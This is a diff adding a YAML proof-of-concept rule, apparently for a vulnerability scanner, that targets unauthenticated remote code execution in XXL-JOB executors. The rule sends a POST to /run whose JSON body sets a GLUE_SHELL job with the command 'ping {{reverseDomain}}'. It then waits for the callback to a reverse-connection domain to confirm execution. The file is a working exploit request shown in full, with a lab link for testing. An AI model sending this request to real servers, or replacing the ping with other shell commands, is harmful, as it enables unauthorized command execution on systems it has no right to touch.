@@ -1,0 +1,34 @@
+name: poc-yaml-xxl-job-unauthorized-rce
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseDomain: reverse.domain
+rules:
+    r1:
+        request:
+            method: POST
+            path: "/run"
+            headers:
+                Content-Type: application/json
+            body: |-
+              {
+                "jobId": 1,
+                "executorHandler": "demoJobHandler",
+                "executorParams": "demoJobHandler",
+                "executorBlockStrategy": "COVER_EARLY",
+                "executorTimeout": 0,
+                "logId": 1,
+                "logDateTime": 1586629003729,
+                "glueType": "GLUE_SHELL",
+                "glueSource": "ping {{reverseDomain}}",
+                "glueUpdatetime": 1586699003758,
+                "broadcastIndex": 0,
+                "broadcastTotal": 0
+              }
+        expression: reverse.wait(30)
+expression: r1()
+detail:
+    author: Jarcis-cy(https://github.com/jarcis-cy)
+    links:
+        - https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
